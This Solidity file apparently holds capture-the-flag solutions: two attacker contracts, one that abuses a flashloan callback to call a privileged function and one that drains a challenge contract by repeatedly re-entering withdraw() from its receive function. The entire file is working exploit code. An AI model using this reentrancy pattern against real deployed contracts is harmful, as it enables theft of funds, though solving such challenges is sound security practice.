pragma solidity ^0.8.17;

import "./challengeOne.sol";
import "./challengeTwo.sol";
import "./challengeThree.sol";

contract chall2solve {

	challengeTwo _chall;

	constructor (address _address) payable {
		_chall = challengeTwo(payable(_address));
	}

	function solve() external {
		_chall.flashloan(50e18);
	}

	// this function will be called when money is sent to this contract
	receive() payable external {
		_chall.callMe();
		payable(address(_chall)).call{value:50 ether}("");
	}
}

contract chall3solve {

	challengeThree _chall;
	uint256 internal _counter;

	constructor (address _address) payable {
		_chall = challengeThree(payable(_address));
		_counter = 0;
	}

	receive() external payable {
		if (_counter != 20) {
			_counter += 1;
			_chall.withdraw();
		}
	}
	
	function solve() external {
		_chall.deposit{value: 5 ether}();
		_chall.withdraw();
	}
}
